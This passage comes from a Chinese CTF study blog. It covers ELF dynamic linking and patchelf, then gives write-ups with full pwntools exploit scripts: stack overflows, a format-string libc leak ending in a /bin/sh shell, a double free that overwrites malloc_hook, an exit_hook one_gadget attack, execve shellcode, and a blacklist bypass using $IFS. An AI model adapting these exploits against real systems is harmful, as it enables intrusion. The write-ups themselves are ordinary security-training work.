这里的function_name就是我们需要的函数名了 function_name = dynstr[st_name]; \",\"这个参数 可以粗俗得当作一个属于.rel.plt这个数组的下标 就像是: .rel.plt[reloc_index]\",\"type ELF_Rel struct { r_offset int64 r_info int } rel.plt = []Elf_Rel{} \",\"r_offset: 存储 我们需要修改的plt条目的位置 相当于是告诉我们PLT[N]中的这个N 但是其实这里r_offset是一个绝对地址 相当于:&PLT[N]\",\"r_info高位3字节 用来表示 .dynsym这个数组的下标 也就是.dynsym[r_info]\",\"然后.dynsym[r_info].st_name获取我们需要的函数名字在.dynstr数组中的下标 然后我们就可以通过.dynstr[st_name]来获取名字了\",\"所以总结一下:\",\".dynstr存函数名字\",\".dynsym存函数名字在.dynstr中的位置\",\".rel_plt存我们需要.dynsym中哪个结构体 方便我们取出名字\"]},\"237\":{\"h\":\"记一次patchelf的使用+浅理解ld和libc\",\"t\":[\"每次去使用xclibc的时候 都不是特别好使hhh 所以就重新了解一下patchelf的使用参考文章:linux动态链接库的加载顺序_动态链接库顺序-CSDN博客和man ld.so 的翻译_ld-linux.so的man手册-CSDN博客获取程序寻找libc的顺序[转] Linux下程序的加载、运行和终止流程 - JollyWing - 博客园 (cnblogs.com)获取linux加载程序的流程\"]},\"238\":{\"h\":\"程序寻找libc的顺序\",\"t\":[\"这里主要是学习一下程序在查找libc的时候的顺序 方便我们理解我们patchelf要修改哪些东西\",\"优先寻找dt_runpath 如果不存在dt_runpath再去寻找dt_rpath\",\"runpath会ld忽略ld_library_path所以当程序由runpath后我们就算修改ld_libary_path也不会起效果\",\"然后就是寻找ld_libary_path\",\"还有个和这个很相似的变量:libray_path这个变量是程序编译期间查找动态链接库时指定查找共享库的路径 也就是动态共享库的路径 所以说这个变量是开发的时候编译使用 为了让编译器能够找到对应的动态库ld_libary_path程序加载运行期间查找动态链接库的路径（系统默认系统之前查找）\",\"从路径:/etc/ld.so.scache中查找文件\",\"从/lib寻找\",\"从/usr/lib中寻找\"]},\"239\":{\"h\":\"linux程序加载简化流程\",\"t\":[\"执行exec(3)系统调用\",\"陷入系统内核操作 由操作系统加载该文件 内存映射将文件加载到内存中\",\"如果文件头中存在pt_interp那么就会将ld找到 并且映射进入内存 然后准备对应环境 将控制权移交给ld、\",\"ld的作用\",\"解析依赖：动态链接器检查程序的头部，找出程序依赖的所有共享库。\",\"加载共享库：动态链接器查找这些共享库的位置，并将它们加载到内存中。\",\"符号解析：动态链接器解析程序中的符号引用，确保它们指向正确的地址。\"]},\"240\":{\"h\":\"查看程序当前信息\",\"t\":[\"获取目前程序的ld和libc的路径信息\",\"ldd file_name \",\"可以得到libc.so.6的当前绑定地址\",\"ld当前绑定地址\",\"ldd --version \",\"可以查看当前libc和ld的版本\"]},\"241\":{\"h\":\"修改程序的 ld 和 libc 地址\",\"t\":[\"修改ld的地址\",\"patchelf --set-interpreter ld_addr file_name \",\"修改libc的地址\",\"这里old_libc就是ldd查到的那个ld地址(==>之前)比如:libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 那么就是libc.so.6\",\"patchelf --replace-needed old_libc new_libc file_name \",\"修改Libc的地址(不太稳定)\",\"patchelf --set-rpath new_rpath your_file \"]},\"242\":{\"h\":\"HgameWeek2Babyre\",\"t\":[\"看上去应该是简单的hh\"]},\"243\":{\"h\":\"解释部分函数\",\"t\":[\"pthread_create 函数 看名字就应该差不多能推断出来是一个线程创建函数\",\"int pthread_create(pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg); \",\"thread: 指向 pthread_t 变量的指针，函数成功完成时，这个变量将被填充为新创建线程的线程ID。\",\"attr: 指向 pthread_attr_t 结构体的指针，该结构体指定了新线程的属性。如果此值为 NULL，则使用默认属性创建线程。\",\"start_routine: 指向将由新线程执行的函数的函数指针。这个函数必须返回一个 void * 并且接受一个 void * 参数。\",\"arg: 指向将被传递给 start_routine 函数的参数的指针。\",\"函数在成功时返回 0，在失败时返回非零错误编号。\",\"pthread_join 函数是 POSIX 线程库（pthreads）中的一个函数，用于等待指定的线程结束。\",\"当一个线程结束时，它的资源不会立即被操作系统回收，直到其他线程对其进行了回收操作。pthread_join 函数允许一个线程等待另一个线程结束，并回收其资源，类似于进程中的 wait 系统调用。\",\"#include <pthread.h> int pthread_join(pthread_t thread, void **retval); \",\"thread: 要等待的线程标识符，是调用 pthread_create 时创建线程的返回值。\",\"retval: 指向一个指针的指针，用于接收被等待线程的退出状态。如果不关心退出状态，可以传递 NULL。\"]},\"244\":{\"h\":\"正式做题\",\"t\":[\"先大概把类型改改 把变量名字改改\",\"__int64 __fastcall main(__int64 a1, char **a2, char **a3) { int i; // [rsp+0h] [rbp-40h] int j; // [rsp+4h] [rbp-3Ch] pthread_t newthread; // [rsp+10h] [rbp-30h] BYREF pthread_t v7; // [rsp+18h] [rbp-28h] BYREF pthread_t v8; // [rsp+20h] [rbp-20h] BYREF pthread_t v9[3]; // [rsp+28h] [rbp-18h] BYREF v9[2] = __readfsqword(0x28u); get_input(); if ( !__sigsetjmp(env, 1) ) { signal(8, (__sighandler_t)handler); for ( i = 0; i <= 5; ++i ) *((_BYTE *)&value + i) ^= 0x11u; } sem_init(&sem, 0, 1u); sem_init(&stru_557BBE9C2280, 0, 0); sem_init(&stru_557BBE9C22A0, 0, 0); sem_init(&stru_557BBE9C22C0, 0, 0); pthread_create(&newthread, 0LL, (void *(*)(void *))dest0, 0LL); pthread_create(&v7, 0LL, dest1, 0LL); pthread_create(&v8, 0LL, dest2, 0LL); pthread_create(v9, 0LL, dest3, 0LL); for ( j = 0; j <= 3; ++j ) pthread_join(*(&newthread + j), 0LL); sub_557BBE9BF803(); return 0LL; } \"]},\"245\":{\"h\":\"流程\",\"t\":[\"先是get我们的输入 然后在我们输入最后的位置加入249数据\",\"对value变量xor 我们点入value变量 查看相关引用 发现主要用在加密input上面 并且发现下面这个函数 说明初始值是feifei\",\"void sub_557BBE9BF2E9() { strcpy((char *)&value, \\\"feifei\\\"); } \",\"然后分别开启四个函数 并发开启\",\"几乎每个函数都是长这个样子的 我们猜测是每个函数要等待上一个函数执行完毕再执行\",\"真实情况我们以动调为标准\",\"void __fastcall __noreturn dest0(void *a1) { while ( 1 ) { sem_wait(&sem); if ( n > 31 ) break; input[n] += *((char *)&value + (n + 1) % 6) * input[n + 1]; ++n; sem_post(&stru_557BBE9C2280); } sem_post(&stru_557BBE9C2280); pthread_exit(0LL); } \",\"最后就是检查input是否为flag了\"]},\"246\":{\"h\":\"动调\",\"t\":[\"由于这题涉及多线程 所以我们就在每个加密函数里面打idapython的脚本 来看看对应函数运行的时候n的值\",\"import idc print(\\\"dest 0 n:\\\",idc.get_reg_value(\\\"eax\\\")) \",\"类似于这样 也就是在dest函数下面写入对应的脚本 来看看运行的顺序\",\"dest 0 n: 0 dest 1 n: 1 dest 2 n: 2 dest 3 n: 3 dest 0 n: 4 dest 1 n: 5 dest 2 n: 6 dest 3 n: 7 dest 0 n: 8 dest 1 n: 9 dest 2 n: 10 dest 3 n: 11 dest 0 n: 12 dest 1 n: 13 dest 2 n: 14 dest 3 n: 15 dest 0 n: 16 dest 1 n: 17 dest 2 n: 18 dest 3 n: 19 dest 0 n: 20 dest 1 n: 21 dest 2 n: 22 dest 3 n: 23 dest 0 n: 24 dest 1 n: 25 dest 2 n: 26 dest 3 n: 27 dest 0 n: 28 dest 1 n: 29 dest 2 n: 30 dest 3 n: 31 dest 0 n: 32 dest 1 n: 32 dest 2 n: 32 dest 3 n: 32 \",\"以及value的部分\",\"get_input(); if ( !__sigsetjmp(env, 1) ) { signal(8, (__sighandler_t)handler); for ( i = 0; i <= 5; ++i ) *((_BYTE *)&value + i) ^= 0x11u; } \",\"这里我们动调发现value的值在xor第三次的时候就终止了 所以参与下面加密函数的value值为:\",\"char value[6] = { 0x77, 0x74, 0x78, 0x66, 0x65, 0x69 }; \"]},\"247\":{\"h\":\"脚本\",\"t\":[\"流程知道了 反调试知道了 现在提取flag数据进行解密\",\"#include <stdio.h> char value[6] = { 0x77, 0x74, 0x78, 0x66, 0x65, 0x69}; unsigned int flag[33] = { 0x00002F14, 0x0000004E, 0x00004FF3, 0x0000006D, 0x000032D8, 0x0000006D, 0x00006B4B, 0xFFFFFF92, 0x0000264F, 0x0000005B, 0x000052FB, 0xFFFFFF9C, 0x00002B71, 0x00000014, 0x00002A6F, 0xFFFFFF95, 0x000028FA, 0x0000001D, 0x00002989, 0xFFFFFF9B, 0x000028B4, 0x0000004E, 0x00004506, 0xFFFFFFDA, 0x0000177B, 0xFFFFFFFC, 0x000040CE, 0x0000007D, 0x000029E3, 0x0000000F, 0x00001F11, 0x000000FF, 0xFA}; void dest3(int n) { printf(\\\"dest3 n:%d\\\\n\\\", n); flag[n] ^= flag[n + 1] - value[(n + 1) % 6]; } void dest2(int n) { printf(\\\"dest2 n:%d\\\\n\\\", n); flag[n] /= flag[n + 1] + value[(n + 1) % 6]; } void dest1(int n) { printf(\\\"dest1 n:%d\\\\n\\\", n); flag[n] += value[(n + 1) % 6] ^ flag[n + 1]; } void dest0(int n) { printf(\\\"dest0 n:%d\\\\n\\\", n); flag[n] -= value[(n + 1) % 6] * flag[n + 1]; } int main() { printf(\\\"test\\\"); for (int i = 31; i >= 0; i--) { switch (i % 4) { case 3: dest3(i); break; case 2: dest2(i); break; case 1: dest1(i); break; case 0: dest0(i); break; default: break; } /* code */ } printf(\\\"\\\\nOutput:\\\\n\\\"); for (int i = 0; i < 32; i++) { printf(\\\"%c\\\", flag[i]); /* code */ } } \"]},\"248\":{\"h\":\"nc签到题(常用指令绕过)\",\"t\":[\"第一次拿到这个附件 丢进ida里面没用 后缀改为.zip 也没有看见什么东西 一筹莫展 拿这玩意丢进虚拟机里面跑了一下 发现了import无效指令 所以才改后缀为py 才看见代码\",\"import os art = ''' (( \\\"####@@!!$$ )) `#####@@!$$` )) (( '####@!!$: (( ,####@!!$: )) .###@!!$: `##@@!$: `#@!!$ !@# `#@!$: @#$ #$ `#@!$: !@! '@!$: '`\\\\ \\\"!$: /`' '\\\\ '!: /' \\\"\\\\ : /\\\" -.\\\"-/\\\\\\\\\\\\-.\\\"//.-\\\"/:`\\\\.\\\"-.JrS\\\".\\\"-=_\\\\\\\\ \\\" -.\\\"-.\\\\\\\\\\\"-.\\\"//.-\\\".`-.\\\"_\\\\\\\\-.\\\".-\\\\\\\".-//''' print(art) print(\\\"My_shell_ProVersion\\\") blacklist = ['cat','ls',' ','cd','echo','<','${IFS}'] while True: command = input() for i in blacklist: if i in command: exit(0) os.system(command) \"]},\"249\":{\"h\":\"linux中常用的指令\",\"t\":[\"1、cat命令—用于将文件内容输出到终端上，经常使用于查看文本文件的内容。\",\"2、less命令—用于分页查看文件内容，可以向上翻页、向下翻页、搜索关键字等，合适查看大文件。\",\"less [options] file_name \",\"options: \",\"-N 或 --LINE-NUMBERS：显示每行的行号。\",\"-S 或 --chop-long-lines：不折行长行。默认情况下，less 会折行显示超出屏幕宽度的长行。使用此选项后，长行将不会被折行，而是横向滚动显示。\",\"-M 或 --LONG-PROMPT：显示更详细的提示信息，包括文件的百分比位置等。\",\"-i 或 --ignore-case：在搜索时忽略大小写。默认情况下，less 的搜索是区分大小写的。\",\"-g 或 --hilite-search：仅高亮显示最后一次搜索匹配的字符串。\",\"-E 或 --QUIT-AT-EOF：在到达文件末尾时自动退出。\",\"-m 或 --LONG-PROMPT：显示百分比表示的文件位置。\",\"-R 或 --RAW-CONTROL-CHARS：显示控制字符（如颜色代码）。\",\"-X 或 --no-init：不清空屏幕。在退出 less 时，屏幕上显示的文本不会被清除。\",\"-F 或 --quit-if-one-screen：如果文件内容能够在一屏内显示完毕，则自动退出 less。\",\"-? 或 --help：显示帮助信息。\",\"键盘操作:\",\"Space 或 f：向下滚动一页。\",\"b：向上滚动一页。\",\"Arrow keys：逐行滚动。\",\"/：向下搜索字符串。\",\"?：向上搜索字符串。\",\"n：重复上一次搜索（向下）。\",\"N：重复上一次搜索（向上）。\",\"q：退出 less。\",\"3、more命令—与less类似，也是用于分页查看文件内容，但是功能较少，只能向下翻页。\",\"more [options] file_name \",\"4、head命令—用于查看文件的前几行内容，默许情况下显示前10行。\",\"head [options] [file...] \",\"其中，[file...] 是一个或多个文件名。如果没有指定文件，或者文件名为 -，head 会从标准输入读取数据。\",\"-n [数值] 或 --lines=[数值]：显示文件开始的指定行数。例如，head -n 5 file.txt 会显示 file.txt 的前 5 行。\",\"-c [数值] 或 --bytes=[数值]：显示文件开始的指定字节数。例如，head -c 100 file.txt 会显示 file.txt 的前 100 个字节。\",\"-q 或 --quiet：在处理多个文件时不打印每个文件的名称作为头部。\",\"-v 或 --verbose：总是打印每个文件的名称作为头部。\",\"5、tail命令—用于查看文件的后几行内容，默许情况下显示文件的最后10行。 6、nl命令—用于在文件中加上行号，便于查看和编辑文件。 7、vi/vim命令—是一种文本编辑器，可以用于查看和编辑文件内容，适用于高级用户。\"]},\"250\":{\"h\":\"IFS变量\",\"t\":[\"这里提到IFS作为Shell的内置变量，是一个用于分割字段的字符列表\"]},\"251\":{\"h\":\"IFS 的工作原理\",\"t\":[\"IFS 是一个特殊的 shell 变量，用于定义字段边界。它告诉 shell 如何解释序列和字段分隔符。这对于文本解析、命令行参数处理以及读取和解析数据至关重要。\",\"默认情况下，IFS 包含空格、制表符和换行符。这意味着 shell 在处理文本时会将这些字符视为字段之间的分隔符。\",\"更改 IFS 的值可以改变 shell 解释数据的方式。这特别有用于处理非标准格式的数据。\"]},\"252\":{\"h\":\"这里举列子:\",\"t\":[\"IFS=',' line=\\\"apple,banana,cherry\\\" for fruit in $line; do echo $fruit done # 输出：apple banana cherry \"]},\"253\":{\"h\":\"payload\",\"t\":[\"head$IFS$1flag\"]},\"254\":{\"h\":\"siscn_pwn1(栈迁移+float数据格式)\",\"t\":[\"看一下题发现应该是比较简单的 由于有个gets函数 所以我有点想直接覆盖数据为11.28125\",\"int func() { char v1[44]; // [rsp+0h] [rbp-30h] BYREF float v2; // [rsp+2Ch] [rbp-4h] v2 = 0.0; puts(\\\"Let's guess the number.\\\"); gets(v1); if ( v2 == 11.28125 ) return system(\\\"cat /flag\\\"); else return puts(\\\"Its value should be 11.28125\\\"); } \",\"保护\",\"[*] '/home/agentalbrazee/work/ctf/pwn/cp/nssctf/pwn1/pwn1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \"]},\"255\":{\"h\":\"实验float的存储数据\",\"t\":[\"为了实验一下 我们手搓一个程序 gdb调试一下\",\"#include<stdio.h> int main() { float a; a = 11.28125; printf(\\\"The value of a is %f\\\\n\\\",a); } \",\"获取结果:\",\"► 0x5555555551c7 <main+62> call __isoc99_scanf@plt <__isoc99_scanf@plt> format: 0x555555556004 ◂— 0x7620656854006625 /* '%f' */ vararg: 0x7fffffffdee4 ◂— 0xc7df9b0041348000 \",\"那么我们就知道了 这里的存储数据为0xc7df9b0041348000\",\"但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来\",\"int __cdecl main(int argc, const char **argv, const char **envp) { float v4; // [rsp+2Ch] [rbp-4h] BYREF _main(argc, argv, envp); v4 = 11.28125; scanf(\\\"%f\\\", &v4); printf(\\\"The value of a is %f\\\\n\\\", v4); return 0; } \",\"然后在scanf里面下idapython脚本:\",\"import idc print(\\\"rax\\\",hex(idc.get_reg_value(\\\"rax\\\"))) \",\"获取数据:rax 0x61fe1c 好像还是不太对\",\"(太笨了)最后我们直接在程序源代码重找cmp的部分找到了\",\".rodata:00000000004007F4 00 80 34 41 dword_4007F4 dd 41348000h \"]},\"256\":{\"h\":\"尝试覆盖\",\"t\":[\"from pwn import * # r = remote(\\\"node5.anna.nssctf.cn\\\",28355) r = gdb.debug(\\\"./pwn1\\\",\\\"b main\\\") print(r.recvuntil(b\\\"Let's guess the number.\\\\n\\\")) payload = b\\\"a\\\"*(0x30 - 4) +p32(0x41348000) r.sendline(payload) r.interactive() \",\"最后成功\"]},\"257\":{\"h\":\"PWN\"},\"258\":{\"h\":\"BabyGift\",\"t\":[\"image-20240422202855033\",\"利用这里会让字符串地址赋值给rdi 然后我们通过劫持程序流程跑到printf处 利用格式化字符串漏洞就能泄露libc地址 然后触发system函数\",\"from pwn import * # context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') # context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 64472 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *Menu+113\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) pop_rbp = p64(0x4012D0) lea_rax = p64(0x4012A0 ) bss = p64(0x404020+0x200) sub_rsp = p64(0x4012DC) ret = p64(0x40101a) mov_rax_0_pop_rbp = p64(0x4012CB) mov_rax_printf = p64(0x401202) ru(b\\\"Your name:\\\\n\\\") sl(b\\\"elegy\\\") ru(b\\\"Your passwd:\\\\n\\\") payload = b\\\"%27$p%11$p\\\".ljust(0x20,b\\\"a\\\")+p64(0x404020+0x100)+mov_rax_printf +p64(0x40122D)*2 sd(payload) res = rl() libc_base = int(res[:14],16) -128 -0x29DC0 stack_addr = int(res[14:28],16) print(\\\"stack_addr\\\",hex(stack_addr)) system_addr = 0x50D70 +libc_base print(hex(libc_base)) ru(b\\\"Your name:\\\\n\\\") sl(b\\\"elegy\\\") ru(b\\\"Your passwd:\\\\n\\\") payload = b\\\"/bin/sh\\\\x00\\\".ljust(0x28,b\\\"a\\\") +ret+p64(system_addr) sl(payload) ia() \"]},\"259\":{\"h\":\"fastfastfast\",\"t\":[\"简单的堆题 free的时候没有做任何检测 直接double free 然后通过指向bss表中 泄露出标准io地址从而推算出libc地址\",\"image-20240422211524070\",\"double free后任意地址malloc\",\"image-20240422211447696\",\"bss段标准输入输出流io地址信息\",\"image-20240422211628353\",\"通过在gdb中输入libc获取libc基础地址来算和io之间的地址偏差\",\"image-20240422211647867\",\"算一下偏差就可以了\",\"然后通过第二次double free 修改malloc hook 为onegadget即可\"]},\"260\":{\"h\":\"脚本\",\"t\":[\"from pwn import * # context(os='linux', arch='mips',endian=\\\"little\\\", log_level='debug') context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"\\\" port = 1111 elf = ELF(file_name) # p= process(file_name) p = gdb.debug(file_name,\\\"b *main+42\\\") # p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def Menu(index): ru(b\\\">>> \\\") sl(index) def create(index,content): Menu(b\\\"1\\\") ru(b\\\"please input note idx\\\\n\\\") sl(str(index).encode()) ru(b\\\"please input content\\\\n\\\") sd(content) print(f\\\"创建了一个index:{index}的chunk\\\") def delete(index): Menu(b\\\"2\\\") ru(b\\\"please input note idx\\\\n\\\") sl(str(index).encode()) print(f\\\"删除一个index:{index}的chunk\\\") def show(index): Menu(b\\\"3\\\") ru(b\\\"please input note idx\\\\n\\\") sl(str(index).encode()) return rc(0x68) #构造double free for i in range(9): create(i,chr(0x61+i).encode()*0x68) for i in range(9): delete(i) delete(7) for i in range(7): create(i,chr(0x61+i).encode()) got_addr = 0x401050 bss_addr = 0x404070 # 控制fd 指向我们想要malloc的地址 create(7,p64(bss_addr)) create(8,b\\\"aaaaaaaa\\\") create(9,b\\\"a\\\") # 控制bss_addr段 create(10,p64(bss_addr)) print(\\\"开始泄露\\\") res = show(10) # print(\\\"res\\\",u64(res[16:24])) #算出libc libc_base = u64(res[16:24]) - 2021024 system_addr = libc_base + 0xe3b31 malloc_hook = libc_base + (0x7f291e7a2b70-0x7f291e5b6000 ) print(\\\"libc_base:\\\",hex(libc_base)) print(\\\"malloc_hook:\\\",hex(malloc_hook)) print(\\\"system_addr:\\\",hex(system_addr)) print(\\\"成功泄露\\\") #第二次double free for i in range(9): create(i,b\\\"aaaaaaaa\\\"*2) for i in range(9): delete(i) print(\\\"两个fastbin情况\\\") # input(\\\"e\\\") delete(7) print(\\\"构造double free\\\") for i in range(7): create(i,b\\\"aaaaaaaa\\\"*2) print(\\\"tcache删除完毕\\\") # 修改malloc_hook create(8,p64(malloc_hook )) create(9,p64(0x0)) print(\\\"malloc_hook:\\\",hex(malloc_hook)) print(\\\"system_addr:\\\",hex(system_addr)) create(10,p64(system_addr)) create(11,p64(system_addr)) create(12,b\\\"a\\\") ia() \"]},\"261\":{\"h\":\"fmt\",\"t\":[\"scanf和fmt类似 有格式化 我们可以通过%n$p来实现指定第几个参数地址写入内容 然后前六个参数都是寄存器 后面的参数就是栈地址了 按照栈顶依次选择\",\"这题我们拥有两次写入机会 我们可以第一次写入目标地址 然后第二次通过scanf来向目标地址写入数据\",\"我们选择打exit_hook 写入one_gadget 就可以成功劫持了\"]},\"262\":{\"h\":\"exit hook地址写入栈:\",\"t\":[\"image-20240422212450209\"]},\"263\":{\"h\":\"选择\",\"t\":[\"%7$ld \"]},\"264\":{\"h\":\"脚本\",\"t\":[\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] # file_name = \\\"./vuln\\\" url = \\\"127.0.0.1\\\" port = 53235 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b main\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) res = ru(b\\\"\\\\n\\\") printf_addr = int(res[-15:-1],16) print(\\\"printf_addr:\\\",hex(printf_addr)) libc_base = printf_addr - 0x61CC0 print(\\\"libc_base:\\\",hex(libc_base)) exit_hook_addr = libc_base +2240352+8 exit_hook_args_addr = libc_base +2238824 system_addr = libc_base +0x522C0 one_gadget = libc_base +0xe3b2e print(\\\"exit_hook:\\\",hex(exit_hook_addr)) print(\\\"exit_hook args\\\",hex(exit_hook_args_addr)) print(\\\"system_addr:\\\",hex(system_addr)) print(\\\"one_gadget:\\\",hex(one_gadget)) # cannary-8位置 cannary = libc_base +2045376+0x28 -0x8 print(\\\"cannary:\\\",hex(cannary)) # %7$d 就是rsp+8 # 第一次构造 # payload = b\\\"%64s%13$s\\\".ljust(0x8,b\\\"a\\\")+p64(cannary)*3 payload =b\\\"%7$ld\\\".ljust(8,b\\\"\\\\x00\\\")+p64(exit_hook_addr) # payload =b\\\"%13$s\\\" sd(payload) payload=str(one_gadget).encode() input(\\\":\\\") # payload = b\\\"d\\\"*0x38+p64(cannary)+b\\\"c\\\".ljust(32,b\\\"c\\\") sl(payload) ia() \"]},\"265\":{\"h\":\"GuestBook\",\"t\":[\"存在栈的off_by_one漏洞 我们通过提前在栈里面写满backdoor地址 然后通过修改返回地址最后一个字节 来实现栈迁移返回到存放backdoor的栈地址上 只要写满了 概率还挺大 然后就可以在第二次返回的时候触发backdoor函数\",\"image-20240422213216922\",\"import time from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"xyctf.top\\\" port = 34019 # elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *0x401321\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) def add(index,name,id): ru(b\\\"index\\\\n\\\") sl(str(index).encode()) ru(b\\\"name:\\\\n\\\") sd(name) ru(b\\\"id:\\\\n\\\") sl(id) backdoor = 0x40133A for i in range(0,31): add(i,p64(backdoor)*2,b\\\"0\\\") add(32,b\\\"\\\\x3a\\\\x13\\\\x40\\\",b\\\"48\\\") ru(b\\\"index\\\\n\\\") sl(b\\\"-1\\\") ru(b\\\"Have a good time!\\\\n\\\") time.sleep(2) sd(b\\\"ls\\\") # print(rl()) ia() \"]},\"266\":{\"h\":\"hello_world\",\"t\":[\"两次栈溢出 第一次泄露libc 第二次直接劫持程序流程one_gadget\",\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"xyctf.top\\\" port = 35494 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b main\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) ru(b\\\"please input your name: \\\") sd(b\\\"a\\\"*0x28+b\\\"\\\\x91\\\") result = rl()[-7:-1] baselibc = u64(result.ljust(8,b\\\"\\\\x00\\\")) +47 -0x29DC0 print(result) print(hex(baselibc)) ru(b\\\"please input your name: \\\") rb= p64(0x2072+0x78+baselibc) sd(b\\\"a\\\"*0x20+p64(0)+p64(0x50a47+baselibc)) ia() \"]},\"267\":{\"h\":\"Intermittent\",\"t\":[\"一次性4字节shellcode空间\",\"本来想的是每次用两字节操作两字节跳转到下一个可执行区域 发现不太现实\",\"然后发现跳转到执行shellcode的地方的时候寄存器上已经几乎布置好了一些我们需要的值\",\"image-20240422214330654\",\"image-20240422214400338\",\"我们可以利用rep movsb指令 这个指令可以让rsi寄存器的地址开始rcx的字节数据赋值给rdi地址所指的区域 我们可以发现rdx已经有了我们执行shellcode的地址 然后rsi就是我们输入的字符串地址 我们只需要让rdx寄存器的值给rdi 然后触发rep movsb即可 就可以实现shellcode的写入\",\"rep movsb是两字节 我们用栈传递参数让rdx赋值给rdi 两字节 刚好四字节 那么我们字符串后面填上getshell的shellcode即可\",\"from pwn import * context(os='linux', arch='amd64', log_level='debug') # context(os='linux', arch='amd64') context.terminal = ['byobu', 'sp', '-h'] file_name = \\\"./vuln\\\" url = \\\"\\\" port = 1111 elf = ELF(file_name) # p= process(file_name) p = gdb.debug(file_name,\\\"b *main+273\\\") # p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) sa = lambda n,s : p.sendafter(n,s) sla = lambda n,s : p.sendlineafter(n,s) rc = lambda n : p.recv(n) rl = lambda : p.recvline() ru = lambda s : p.recvuntil(s) ra = lambda : p.recvall() ia = lambda : p.interactive() uu32 = lambda data : u32(data.ljust(4, b'\\\\x00')) uu64 = lambda data : u64(data.ljust(8, b'\\\\x00')) ru(b\\\"show your magic: \\\") shellcode1 = b'\\\\x52\\\\x5F\\\\xF3\\\\xA4' # nop指令不重要 shellcode2 = b'\\\\x90'*4 shellcode3 = b'\\\\x90'*4 shellcode = shellcode1 +b\\\"\\\\x31\\\\xf6\\\\x48\\\\xbb\\\\x2f\\\\x62\\\\x69\\\\x6e\\\\x2f\\\\x2f\\\\x73\\\\x68\\\\x56\\\\x53\\\\x54\\\\x5f\\\\x6a\\\\x3b\\\\x58\\\\x31\\\\xd2\\\\x0f\\\\x05\\\" sd(shellcode.ljust(0x100,b\\\"\\\\x90\\\")) ia() \"]},\"268\":{\"h\":\"inviisible_flag\",\"t\":[\"禁止了orw的orw 我们直接使用平替函数 新建标签页 (mebeim.net)推荐这个网站进行查看有哪些函数和传参规范\",\"先开始想复杂了 想成了利用retfq来转化为32位绕过open等函数的禁止 参考强网杯的shellcode第五届强网杯 Pwn - shellcode - Bugku CTF还是学到了东西 甚至去想办法触发新的mmap函数来获取一个低地址的可执行区域 然后把shellcode copy过去执行 因为refq不支持跳转超过四字节的地址 结果发现想复杂了 这里保留了原本的构思代码\",\"tips:sendfile64(调用号:0x28)可以直接让一个文件描述符的内容输出到另一个文件描述符上非常适合平替这次的write函数\",\"from pwn import * context(log_level='debug') context(os='linux') context.terminal = ['byobu', 'sp', '-h'] # shellcode_copy = asm( # ''' # copy_loop: # cmp rcx, 0 # je end_copy # mov al, [rsi] # mov [rdi], al # inc rsi # inc rdi # dec rcx # jmp copy_loop # end_copy: # ''' # ,arch=\\\"amd64\\\") file_name = \\\"./vuln\\\" url = \\\"xyctf.top\\\" port =35002 elf = ELF(file_name) # p= process(file_name) # p = gdb.debug(file_name,\\\"b *main+181\\\") # b 0x114514061 # p = gdb.debug(file_name,\\\"b *0x114514061\\\") p = remote(url,port) sd = lambda s : p.send(s) sl = lambda s : p.sendline(s) 